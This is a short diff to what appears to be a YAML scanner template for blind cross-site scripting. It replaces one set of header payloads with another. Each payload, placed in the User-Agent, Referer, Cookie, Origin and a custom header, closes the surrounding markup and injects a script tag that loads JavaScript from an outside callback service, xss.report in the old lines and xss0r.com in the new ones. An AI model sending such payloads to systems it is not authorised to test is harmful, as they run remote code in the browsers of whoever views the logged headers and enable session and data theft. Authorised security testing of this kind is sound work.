@@ -13,8 +13,8 @@ requests:
     redirects: true
     max-redirects: 5
     headers:
-      User-Agent: "Mozilla UACanary12345\'&#8211;><script src=https://xss.report/c/hnterx></script>"
-      Gibberish: "XFFCanary12345.{{Hostname}}'&#8211;><script src=https://xss.report/c/hnterx></script>"
-      Referer: "RFcanary12345.comRF'&#8211;><script src=https://xss.report/c/hnterx></script>"
-      Cookie: "CKCanary12345=qwertyCK'&#8211;><script src=https://xss.report/c/hnterx></script>"
-      Origin: "ORCanary12345.comOR'&#8211;><script src=https://xss.report/c/hnterx></script>"
+      User-Agent: "Mozilla UACanary12345\'&#8211;><script src=https://xss0r.com/c/nepax></script>"
+      Gibberish: "XFFCanary12345.{{Hostname}}'&#8211;><script src=https://xss0r.com/c/nepax></script>"
+      Referer: "RFcanary12345.comRF'&#8211;><script src=https://xss0r.com/c/nepax></script>"
+      Cookie: "CKCanary12345=qwertyCK'&#8211;><script src=https://xss0r.com/c/nepax></script>"
+      Origin: "ORCanary12345.comOR'&#8211;><script src=https://xss0r.com/c/nepax></script>"
